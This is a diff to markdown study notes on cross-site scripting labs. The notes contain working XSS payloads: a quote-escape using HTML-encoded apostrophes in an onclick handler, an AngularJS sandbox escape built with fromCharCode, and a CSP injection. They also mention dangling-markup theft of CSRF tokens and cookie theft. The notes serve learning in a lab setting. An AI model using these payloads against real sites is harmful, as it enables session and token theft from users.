@@ -21,7 +21,8 @@ Bypass single/double quotes and backslash escape using HTML encoding and take ad
 
     <a href="http://aha?'-alert(1)-'" onclick="var tracker={track(){}};tracker.track('http:/aha?&apos;-alert(1)-&apos;');">avvv</a>
 
-Consider `x = 'http:/aha?' - alert(1) - ''` -> `alert(1)` will be executed first and then return undefined, `'http:/aha?'` will be converted to a number but since it's not a valid number, it would be NaN -> x = NaN
+- Consider `x = 'http:/aha?' - alert(1) - ''` -> `alert(1)` will be executed first and then return undefined, `'http:/aha?'` will be converted to a number but since it's not a valid number, it would be NaN -> x = NaN
+- Why HTML encoding works here: the payload is writing into the `onclick` event in the context of HTML, that's why when the browser sees the HTML encoded version of the single quote, it automatically decodes it into a valid single quote.
 
 Make the victim post the comment showing it's cookie:
 
@@ -75,7 +76,7 @@ Use `<svg>` with `<animate>` to set attribute to `<a>` tag
         </a>
     </svg>
 
-Inject `script-src-elem 'unsafe-inline` to allow the execution of inline script
+Inject `Content-Security-Policy: script-src-elem 'unsafe-inline'` header to allow the execution of inline script
 
 Dangling markup attack to steal CSRF token:
 when the CSRF token is below the place where dangling markup attack could occur, use this to send the CSRF to a listening server
@@ -84,7 +85,7 @@ This will make a GET request to the server with the parameter containing the CSR
 
 ### LAB: Reflected XSS with AngularJS sandbox escape without strings
 
-    toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
+  /?search=123&toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
 
 **Execution Chain:**
 | **Step** | **What Happens?** |
